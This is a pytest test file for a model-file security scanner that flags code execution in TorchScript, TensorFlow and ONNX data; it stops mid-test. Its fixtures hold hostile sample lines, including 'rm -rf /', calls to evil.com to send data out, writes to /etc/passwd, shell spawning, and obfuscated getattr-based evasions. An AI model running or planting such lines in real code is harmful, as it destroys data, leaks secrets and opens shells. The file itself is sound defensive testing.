"""Tests for JIT/Script code execution detection."""

import ast
import json
from collections.abc import Iterator, Mapping
from pathlib import Path
from typing import Any

import pytest

from modelaudit.detectors import jit_script as jit_script_module
from modelaudit.detectors.jit_script import JITScriptDetector, detect_jit_script_risks

_PRIORITY_USAGE_STRESS_LINES = 10


class _CountingAliasMapping(Mapping[str, str]):
    def __init__(self, aliases: Mapping[str, str]) -> None:
        self._aliases = aliases
        self.lookups = 0
        self.iterations = 0

    def __getitem__(self, key: str) -> str:
        self.lookups += 1
        return self._aliases[key]

    def __iter__(self) -> Iterator[str]:
        for key in self._aliases:
            self.iterations += 1
            yield key

    def __len__(self) -> int:
        return len(self._aliases)


class TestJITScriptDetector:
    """Test the JITScriptDetector class."""

    def test_detect_dangerous_torch_ops(self):
        """Test detection of dangerous TorchScript operations."""
        detector = JITScriptDetector()

        # Create fake TorchScript data with dangerous operations
        data = b"""
        TorchScript-1.0
        def forward(self, x):
            torch.ops.aten.system("rm -rf /")
            torch.ops.aten.exec("malicious code")
            return x
        """

        findings = detector.scan_torchscript(data, "test_model.pt")
        assert len(findings) >= 2
        assert any("torch.ops.aten.system" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert any("torch.ops.aten.exec" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert all(
            getattr(f, "severity", getattr(f, "severity", "")) == "CRITICAL"
            for f in findings
            if hasattr(f, "pattern") or hasattr(f, "operation")
        )

    def test_detect_torch_jit_compilation(self):
        """Test detection of TorchScript JIT compilation."""
        detector = JITScriptDetector({"strict_mode": True})

        # Create data with JIT markers
        data = b"""
        torch.jit.script
        @torch.jit.compile
        def model_func():
            pass
        """

        findings = detector.scan_torchscript(data, "jit_model.pt")
        assert any(f.type == "jit_usage" for f in findings)

    def test_detect_embedded_pickle_in_torch(self):
        """Test detection of embedded pickle in TorchScript."""
        detector = JITScriptDetector()

        # Simulate TorchScript with pickle opcodes
        data = b"TorchScript\x00GLOBAL torch.nn Module\x00"

        findings = detector.scan_torchscript(data)
        assert any(f.type == "embedded_pickle" for f in findings)
        assert any("pickle" in f.message.lower() for f in findings)

    def test_detect_dangerous_tf_ops(self):
        """Test detection of dangerous TensorFlow operations."""
        detector = JITScriptDetector()

        # Create fake TensorFlow SavedModel data
        data = b"""
        saved_model.pb
        tf.py_func(lambda x: exec('malicious'), [input])
        tf.numpy_function(dangerous_func, [x], tf.float32)
        """

        findings = detector.scan_tensorflow(data, "model.pb")
        assert len(findings) >= 2
        assert any(f.operation is not None and "tf.py_func" in f.operation for f in findings)
        assert any(f.operation is not None and "tf.numpy_function" in f.operation for f in findings)

    def test_detect_keras_lambda_layers(self):
        """Test detection of Keras Lambda layers."""
        detector = JITScriptDetector()

        # Create data with Keras Lambda layer
        data = b"""
        tensorflow.keras.layers.Lambda
        lambda x: eval(x)
        """

        findings = detector.scan_tensorflow(data)
        assert any(f.type == "lambda_layer" for f in findings)
        assert any("Lambda" in f.message for f in findings)

    def test_detect_onnx_custom_operators(self):
        """Test detection of ONNX custom operators."""
        detector = JITScriptDetector()

        # Create fake ONNX data with custom operators
        data = b"""
        ai.onnx.contrib.custom_op
        PythonOp: eval_code
        """

        findings = detector.scan_onnx(data, "model.onnx")
        assert any(f.type == "custom_operator" for f in findings)
        assert any(f.type == "python_operator" for f in findings)

    def test_detect_dangerous_imports_in_code(self):
        """Test detection of dangerous imports in embedded code."""
        detector = JITScriptDetector()

        # Create data with embedded Python code containing dangerous imports
        data = b"""
        def malicious_function():
            import os
            import subprocess
            os.system('evil command')
            subprocess.call(['rm', '-rf', '/'])
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("os" in getattr(f, "import_", "") for f in findings)
        assert any("subprocess" in getattr(f, "import_", "") for f in findings)
        assert any(f.severity == "CRITICAL" for f in findings)

    def test_known_dangerous_import_reuses_compiled_patterns(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Known import checks should not rebuild regex source at call time."""

        def fail_escape(_value: str) -> str:
            raise AssertionError("known import checks should reuse compiled patterns")

        monkeypatch.setattr(jit_script_module.re, "escape", fail_escape)

        assert JITScriptDetector._contains_dangerous_import("import os\n", "os") is True

    def test_scan_torchscript_checks_unmarked_python_blobs(self) -> None:
        """Raw Python payloads should be analyzed even without TorchScript markers."""
        detector = JITScriptDetector()
        data = b"""
        def payload():
            import os
            return os.system("echo pwned")
        """

        findings = detector.scan_torchscript(data, "opaque.bin")

        assert any(getattr(finding, "import_", "") == "os" for finding in findings)

    def test_detect_dangerous_builtins(self):
        """Test detection of dangerous builtins like eval, exec."""
        detector = JITScriptDetector()

        data = b"""
        def process_input(x):
            result = eval(x)
            exec(compile(x, 'string', 'exec'))
            return __import__('os').system(result)
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("eval" in getattr(f, "builtin", "") for f in findings)
        assert any("exec" in getattr(f, "builtin", "") for f in findings)
        assert any("__import__" in getattr(f, "builtin", "") for f in findings)

    def test_embedded_python_code_snippets_redact_secret_assignments(self) -> None:
        detector = JITScriptDetector()
        secret = "SECRETKEY1234567890"
        fallback_secret = "FALLBACKSECRET1234567890"
        data = f"""
        def payload():
            os.environ["AWS_SECRET_ACCESS_KEY"] = "{secret}"
            client_secret = os.getenv("CLIENT_SECRET", "{fallback_secret}")
            return eval("1 + 1")
        """.encode()

        findings = detector._extract_and_check_python_code(data, "Test", "payload.pt")

        serialized = json.dumps([finding.model_dump() for finding in findings], sort_keys=True)
        builtin_finding = next(
            finding for finding in findings if finding.type == "dangerous_builtin" and finding.builtin == "eval"
        )
        assert secret not in serialized
        assert fallback_secret not in serialized
        assert builtin_finding.code_snippet is not None
        assert "AWS_SECRET_ACCESS_KEY" in builtin_finding.code_snippet
        assert 'os.environ["AWS_SECRET_ACCESS_KEY"] = "<redacted>"' in builtin_finding.code_snippet
        assert "client_secret = <redacted>" in builtin_finding.code_snippet
        assert 'eval("1 + 1' in builtin_finding.code_snippet

    def test_contextual_builtin_fallback_redacts_code_snippet(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        detector = JITScriptDetector()
        secret = "CONTEXTUALSECRET1234567890"
        contextual_source = f'api_key = "{secret}"; eval("1 + 1")'
        monkeypatch.setattr(
            JITScriptDetector,
            "_contextual_dangerous_builtin_sources",
            staticmethod(lambda _data: {"eval": contextual_source}),
        )

        findings = detector._extract_and_check_python_code(b"\x00", "Test", "payload.pt")

        builtin_finding = next(
            finding for finding in findings if finding.type == "dangerous_builtin" and finding.builtin == "eval"
        )
        assert builtin_finding.code_snippet is not None
        assert secret not in builtin_finding.code_snippet
        assert 'api_key = "<redacted>"' in builtin_finding.code_snippet
        assert 'eval("1 + 1")' in builtin_finding.code_snippet

    def test_detect_dangerous_builtin_alias_assigned_by_tuple_unpacking(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def process_input(x):
            (sink,) = (eval,)
            return sink(x)
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    def test_dangerous_builtin_alias_tuple_unpacking_can_be_shadowed(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def process_input(x):
            sink = eval
            (sink,) = (len,)
            return sink(x)
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")

        assert not any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    def test_detect_code_execution_patterns(self):
        """Test detection of code execution patterns in binary data."""
        detector = JITScriptDetector()

        # Create data with various execution patterns
        data = b"""
        subprocess.run(['malicious', 'command'])
        os.system('rm -rf /')
        socket.create_connection(('evil.com', 1337))
        urllib.request.urlopen('http://evil.com/steal')
        open('/etc/passwd', 'w').write('hacked')
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("subprocess" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("os command" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("socket" in getattr(f, "pattern", "").lower() for f in findings)

    def test_auto_detect_model_type(self) -> None:
        """Test automatic model type detection."""
        detector = JITScriptDetector()

        # Test PyTorch detection
        pytorch_data = b"TorchScript model data"
        pytorch_findings = detector.scan_model(pytorch_data, "unknown")
        assert isinstance(pytorch_findings, list)

        # Test TensorFlow detection
        tf_data = b"saved_model.pb tensorflow data"
        tf_findings = detector.scan_model(tf_data, "unknown")
        assert isinstance(tf_findings, list)

        # Test ONNX detection
        onnx_data = b"ai.onnx model data"
        onnx_findings = detector.scan_model(onnx_data, "unknown")
        assert isinstance(onnx_findings, list)

    def test_scan_model_detects_unmarked_dangerous_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def payload():
            import os
            return eval("1 + 1") or os.system("id")
        """

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)
        assert any(f.type == "dangerous_builtin" and f.builtin == "eval" for f in findings)

    def test_scan_model_ignores_unmarked_benign_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def normalize(values):
            total = sum(values)
            return [value / total for value in values]
        """

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_non_source_dangerous_text(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b"metadata says eval( is unsupported", "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_detects_unmarked_module_scope_python_source(self) -> None:
        detector = JITScriptDetector()
        findings = detector.scan_model(b"import os\nos.system('id')\n", "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_scan_model_detects_late_unmarked_module_scope_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"# pad\n" * 200000 + b"import os\nos.system('id')\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_extract_embedded_python_marks_byte_budget_incomplete(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * ((jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT // len(b"# pad\n")) + 1)
        data = padding + b"import os\nos.system('id')\n"

        findings = detector._extract_and_check_python_code(data, "TorchScript", "late_payload.pt")

        incomplete = [
            finding
            for finding in findings
            if finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
        ]
        assert len(incomplete) == 1
        assert incomplete[0].details["max_scan_bytes"] == jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT
        assert not any(finding.type == "dangerous_import" and finding.import_ == "os" for finding in findings)

    def test_scan_model_ignores_large_tensorflow_function_metadata_without_python(self) -> None:
        detector = JITScriptDetector()
        data = b"SavedFunction function_spec\n" + b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT + 100)

        findings = detector.scan_model(data, "tensorflow", "saved_model.pb")

        assert not any(finding.type == "analysis_incomplete" for finding in findings)

    def test_scan_model_marks_late_tensorflow_function_source_incomplete(self) -> None:
        detector = JITScriptDetector()
        data = (
            b"SavedFunction function_spec\n"
            + b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT + 100)
            + b"\nimport os\nos.system('id')\n"
        )

        findings = detector.scan_model(data, "tensorflow", "saved_model.pb")

        assert any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
            for finding in findings
        )

    def test_extract_embedded_python_marks_boundary_spanning_source_incomplete(self) -> None:
        detector = JITScriptDetector()
        data = (
            b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT - len(b"\nimport "))
            + b"\nimport os\nos.system('id')\n"
        )

        findings = detector._extract_and_check_python_code(data, "TorchScript", "boundary_payload.pt")

        assert any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
            for finding in findings
        )

    @pytest.mark.parametrize(
        "header",
        [
            b"def payload():\n    values = (\n",
            b"class Payload:\n    values = (\n",
        ],
    )
    def test_extract_embedded_python_marks_long_unparseable_definition_incomplete(self, header: bytes) -> None:
        detector = JITScriptDetector()
        continuation = b"        1,\n"
        data = (
            header
            + continuation * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT // len(continuation) + 1)
            + b"    )\n"
        )

        findings = detector._extract_and_check_python_code(data, "TorchScript", "long_definition.pt")

        assert any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
            for finding in findings
        )

    @pytest.mark.parametrize(
        "prose",
        [
            b"def payload is described here\n",
            b"class Payload is described here\n",
        ],
    )
    def test_scan_model_ignores_large_definition_like_prose(self, prose: bytes) -> None:
        detector = JITScriptDetector()
        data = prose + b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT + 100)

        findings = detector.scan_model(data, "pytorch", "definition_prose.pt")

        assert not any(finding.type == "analysis_incomplete" for finding in findings)

    def test_scan_model_does_not_duplicate_import_only_pytorch_source_findings(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b'import os\nos.system("id")\n', "pytorch", "payload.pt")

        finding_signatures = {
            (finding.type, finding.pattern, finding.import_, finding.operation, finding.message) for finding in findings
        }
        assert len(findings) == 3
        assert len(finding_signatures) == len(findings)

    def test_scan_model_marks_import_only_omitted_middle_incomplete(self) -> None:
        detector = JITScriptDetector()
        padding = b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT + 100)
        data = b"\x00\xff" + padding + b"\nimport harmless_middle\n" + padding

        findings = detector.scan_model(data, "pytorch", "middle_import.pt")

        assert any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
            for finding in findings
        )

    def test_scan_model_ignores_large_prose_import_in_omitted_middle(self) -> None:
        detector = JITScriptDetector()
        padding = b"A" * (jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT + 100)
        prose = b"\ninstructions import numpy for setup\nimport numpy is required by this model\n"
        data = b"\x00\xff" + padding + prose + padding

        findings = detector.scan_model(data, "pytorch", "prose_import.pt")

        assert not any(finding.type == "analysis_incomplete" for finding in findings)

    def test_scan_model_ignores_large_import_near_match(self) -> None:
        detector = JITScriptDetector()
        data = b"metadata_import harmless\n" * (
            jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT // len(b"metadata_import harmless\n") + 1
        )

        findings = detector.scan_model(data, "pytorch", "metadata.pt")

        assert not any(finding.type == "analysis_incomplete" for finding in findings)

    def test_scan_model_ignores_pytorch_tensor_metadata_assignment_near_matches(self) -> None:
        detector = JITScriptDetector()
        chunks = []
        for index in range(jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 20):
            tensor_name = f"transformer.resblocks.{index}.attention.output.weight".encode()
            chunks.append(
                b"X\x06\x00\x00\x00cuda:0r"
                + index.to_bytes(2, "little")
                + b"\x00\x00M\x00\x04tr=\x00\x00QK\x00M\x00\x04\x85r>\x00\x00X"
                + len(tensor_name).to_bytes(4, "little")
                + tensor_name
            )
        data = b"".join(chunks)

        findings = detector.scan_model(data, "pytorch", "tensor_metadata.pkl")

        assert not jit_script_module._embedded_python_source_start_budget_exceeded(data)
        assert not any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_SNIPPET_LIMIT_REASON
            for finding in findings
        )

    def test_scan_model_fails_closed_after_source_start_probe_budget(self) -> None:
        detector = JITScriptDetector()
        data = b"\n".join(
            f"import harmless_{index} is prose".encode()
            for index in range(jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 1)
        )

        findings = detector.scan_model(data, "pytorch", "many_ambiguous_imports.pt")

        assert any(finding.type == "analysis_incomplete" for finding in findings)

    def test_candidate_embedded_python_snippets_caps_compound_priority_starts(self) -> None:
        line_count = jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 26
        lines = [f"if True: import webbrowser as wb_{index}".encode() for index in range(line_count - 1)]
        lines.append(b"if True: import webbrowser as wb; wb.open('https://example.invalid')")
        source = b"\n".join(lines)

        candidates = jit_script_module._candidate_embedded_python_snippets(source)
        findings = JITScriptDetector().scan_model(source, "pytorch", "compound-priority.py")

        assert len(candidates) <= jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES
        assert any(candidate_span[0] == source.rfind(b"if True:") for _candidate, candidate_span, _ranges in candidates)
        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_candidate_embedded_python_snippets_keeps_priority_blocks_within_start_cap(self) -> None:
        compound_lines = b"\n".join(
            f"if True: import webbrowser as wb_{index}".encode()
            for index in range(jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 6)
        )
        priority_blocks = b"".join(f"def block_{index}():\n    return eval\n}}\x00".encode() for index in range(20))

        candidates = jit_script_module._candidate_embedded_python_snippets(compound_lines + b"\n" + priority_blocks)

        assert len(candidates) <= jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES

    def test_scan_model_fails_closed_when_middle_priority_start_is_omitted(self) -> None:
        line_count = jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 26
        lines = [f"if True: import webbrowser as wb_{index}".encode() for index in range(line_count)]
        lines[line_count // 2] = b"if True: import webbrowser as wb; wb.open('https://example.invalid')"
        source = b"}\x00\n".join(lines)

        findings = JITScriptDetector()._extract_and_check_python_code(
            source,
            "TorchScript",
            "middle-compound-priority.bin",
        )

        assert any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_SNIPPET_LIMIT_REASON
            for finding in findings
        )

    def test_prioritized_rescan_fails_closed_when_source_start_budget_is_exceeded(self) -> None:
        line_count = jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 2
        source = b"}\x00\n".join(f"if True: import webbrowser as wb_{index}".encode() for index in range(line_count))
        prioritized = jit_script_module._candidate_embedded_python_snippets(source)

        findings = JITScriptDetector()._extract_and_check_python_code(
            source,
            "TorchScript",
            "prioritized-rescan.bin",
            prioritized_snippets=prioritized,
        )

        assert any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_SNIPPET_LIMIT_REASON
            for finding in findings
        )

    def test_extract_embedded_python_marks_snippet_budget_incomplete(self) -> None:
        detector = JITScriptDetector()
        data = b"\x00".join(
            f"import harmless_{index}".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )

        findings = detector._extract_and_check_python_code(data, "TorchScript", "many_snippets.pt")

        incomplete = [
            finding
            for finding in findings
            if finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_SNIPPET_LIMIT_REASON
        ]
        assert len(incomplete) == 1
        assert incomplete[0].details["omitted_snippets"] > 0
        assert incomplete[0].details["candidate_snippets"] > jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS

    def test_extract_embedded_python_keeps_fully_covered_over_budget_source_clean(self) -> None:
        detector = JITScriptDetector()
        data = b"\n".join(
            f"import harmless_{index}".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )

        findings = detector._extract_and_check_python_code(data, "TorchScript", "covered_snippets.pt")

        assert not any(
            finding.type == "analysis_incomplete"
            and finding.details.get("reason") == jit_script_module._EMBEDDED_PYTHON_SNIPPET_LIMIT_REASON
            for finding in findings
        )

    def test_extract_embedded_python_keeps_benign_within_budgets_clean(self) -> None:
        detector = JITScriptDetector()
        data = b"\n".join(
            f"import harmless_{index}".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)
        )

        findings = detector._extract_and_check_python_code(data, "TorchScript", "benign_snippets.pt")

        assert findings == []

    def test_scan_model_detects_unmarked_from_import_source(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b"from os import system as run\nrun('id')\n", "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return os.posix_spawn('/bin/sh', ['sh'], {})\n",
            b"def payload():\n    return os.posix_spawnp('sh', ['sh'], {})\n",
            b"def payload():\n    return os.startfile('payload.exe')\n",
            b"def payload():\n    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n",
            b"def payload():\n    os.posix_spawn = len\n    return os.posix_spawn([])\n",
            b"def payload(data):\n    os.posix_spawn = pickle.loads\n    return os.posix_spawn(data)\n",
        ],
    )
    def test_scan_model_detects_os_process_launch_source_conservatively(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_binary_framed_string_literal_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n}"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_os_process_launch_with_unrelated_risk(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"import pickle\n\n"
            b"def payload(data):\n"
            b"    pickle.loads(data)\n"
            b"    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            (
                b"import os\n"
                b"import subprocess\n\n"
                b"def payload(args):\n"
                b"    marker = os.posix_spawn\n"
                b"    return subprocess.list2cmdline(args)\n"
            ),
            (
                b"import os\n"
                b"import subprocess\n\n"
                b"def payload():\n"
                b"    marker = os.posix_spawn\n"
                b"    return subprocess.run(['echo', 'ok'], check=False)\n"
            ),
        ],
    )
    def test_scan_model_ignores_uninvoked_os_process_reference_with_unrelated_risk(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import os\n"
            b"    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n"
            b"}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_os_process_launch_before_binary_tail(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import os\n"
            b"    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], dict())\n"
            b"\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_framed_module_import_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffimport os\ndef payload():\n    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_allows_framed_benign_dict_literal_os_accessor(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    import os\n    return {'cwd': getattr(os, 'getcwd')()}\n}"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"async def payload():\n    return await asyncio.create_subprocess_shell('id')\n",
            b"async def payload():\n    return await asyncio.subprocess.create_subprocess_exec('id')\n",
            (
                b"from asyncio import create_subprocess_exec as launch\n"
                b"async def payload():\n    return await launch('id')\n"
            ),
            (
                b"async def payload():\n"
                b"    asyncio.create_subprocess_shell = len\n"
                b"    return asyncio.create_subprocess_shell([])\n"
            ),
            (
                b"async def payload(data):\n"
                b"    asyncio.create_subprocess_exec = pickle.loads\n"
                b"    return asyncio.create_subprocess_exec(data)\n"
            ),
        ],
    )
    def test_scan_model_detects_asyncio_subprocess_launch_source_conservatively(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_asyncio_subprocess_launch_with_unrelated_risk(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"import pickle\n\n"
            b"def payload(data):\n"
            b"    pickle.loads(data)\n"
            b"    return \"asyncio.create_subprocess_shell('id')\"\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_binary_framed_string_literal_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    return \"asyncio.create_subprocess_shell('id')\"\n\x00\xffMODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_lossy_decoded_string_literal_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    # ignored invalid bytes: "
            + (b"\xff" * 64)
            + b"\n    return \"asyncio.create_subprocess_shell('id')\"\n\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_parse_embedded_python_snippet_caps_trim_attempts(self, monkeypatch: pytest.MonkeyPatch) -> None:
        parse_calls = 0

        def fail_parse(_source: str) -> ast.AST:
            nonlocal parse_calls
            parse_calls += 1
            raise SyntaxError("bad syntax", ("<embedded>", 1, 1, "bad"))

        monkeypatch.setattr(jit_script_module.ast, "parse", fail_parse)

        tree = jit_script_module._parse_embedded_python_snippet(
            "def payload():\n" + "\n".join("bad" for _ in range(1000))
        )

        assert tree is None
        assert parse_calls <= jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 2

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = (
            b"\x00\xffdef payload():\n"
            b"    from asyncio import create_subprocess_shell as launch\n"
            b"    return launch('id')\n"
            b"\x00" + tail
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = b"\x00\xffdef payload():\n    import os as o\n    return getattr(o, 'system')('id')\n\x00" + tail

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_asyncio_match_in_unparsed_snippet_after_benign_parse(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def benign():\n"
            b"    return \"asyncio.create_subprocess_shell('id')\"\n"
            b"}\n"
            b"def payload():\n"
            b"if True print('broken')\n"
            b"asyncio.create_subprocess_shell('id')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    from asyncio import create_subprocess_shell as launch\n"
            b"    return launch('id')\n"
            b"}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return runpy._run_module_as_main('payload')\n",
            b"def payload():\n    return runpy.run_module('payload')\n",
            b"def payload():\n    from runpy import run_path as run\n    return run('payload.py')\n",
        ],
    )
    def test_scan_model_detects_unmarked_runpy_execution(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
